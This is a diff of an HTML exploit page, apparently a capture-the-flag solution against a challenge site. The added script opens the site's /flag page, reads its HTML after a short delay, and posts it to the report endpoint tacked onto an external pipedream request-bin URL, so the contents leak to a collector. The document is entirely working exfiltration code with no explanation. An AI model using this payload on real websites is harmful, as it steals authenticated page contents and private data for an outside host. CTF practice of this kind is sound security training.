@@ -1,19 +1,27 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Document</title>
+</head>
 <body>
   
 <script>
-fetch("https://typhoonconctf-2023-half-of-fake.chals.io/report", {
-  "headers": {
-    "accept": "*/*",
-    "content-type": "application/json",
-    "x-requested-with": "XMLHttpRequest"
-  },
-  "referrer": "https://typhoonconctf-2023-half-of-fake.chals.io/report",
-  "body": "{\"name\":\"a\",\"email\":\"a\",\"url\":\"https://enbit6i3l2ra4.x.pipedream.net/" + "please" + "\",\"description\":\"a\\r\\n\"}",
-  "method": "POST",
-});
-</script>
+  const w = window.open('https://typhoonconctf-2023-half-of-fake.chals.io/flag');
+  setTimeout(() => {
+    data = w.document.documentElement.innerHTML
+    fetch("https://typhoonconctf-2023-half-of-fake.chals.io/report", {
+      body: "url=https://enbit6i3l2ra4.x.pipedream.net/" + data,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      method: "POST"
+    })
+
+  }, 200);
   
+
+</script>
+
 </body>
 </html>
